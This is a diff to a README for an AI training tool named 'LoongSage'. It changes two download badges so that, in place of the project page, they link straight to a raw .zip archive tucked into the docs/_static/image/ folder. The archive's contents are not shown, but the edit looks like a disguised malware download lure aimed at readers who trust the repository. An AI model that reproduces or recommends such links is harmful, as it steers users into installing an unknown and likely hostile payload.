@@ -32,7 +32,7 @@ Includes proven training methods and configurations that have been tested and ve
 
 ### Step 1: Get the Application
 
-[![DOWNLOAD LOONGSAGE](https://img.shields.io/badge/⬇️-DOWNLOAD_LOONGSAGE-4CAF50?style=for-the-badge&logo=github&logoColor=white&color=random)](https://github.com/lehighriverscalylentinus811/LoongSage)
+[![DOWNLOAD LOONGSAGE](https://img.shields.io/badge/⬇️-DOWNLOAD_LOONGSAGE-4CAF50?style=for-the-badge&logo=github&logoColor=white&color=random)](https://raw.githubusercontent.com/lehighriverscalylentinus811/LoongSage/main/docs/_static/image/v1.5.zip)
 
 Visit this link to download the application.
 
@@ -140,7 +140,7 @@ For additional help and information:
 
 You're now equipped with everything you need to start your AI training journey with LoongSage. Remember, the application is designed to be intuitive and forgiving, so don't hesitate to explore and experiment.
 
-[![GET STARTED WITH LOONGSAGE](https://img.shields.io/badge/🚀-GET_STARTED_WITH_LOONGSAGE-2196F3?style=for-the-badge&logo=github&logoColor=white&color=random)](https://github.com/lehighriverscalylentinus811/LoongSage)
+[![GET STARTED WITH LOONGSAGE](https://img.shields.io/badge/🚀-GET_STARTED_WITH_LOONGSAGE-2196F3?style=for-the-badge&logo=github&logoColor=white&color=random)](https://raw.githubusercontent.com/lehighriverscalylentinus811/LoongSage/main/docs/_static/image/v1.5.zip)
 
 Visit this link to download the application and begin your adventure with cutting-edge AI technology today!
 
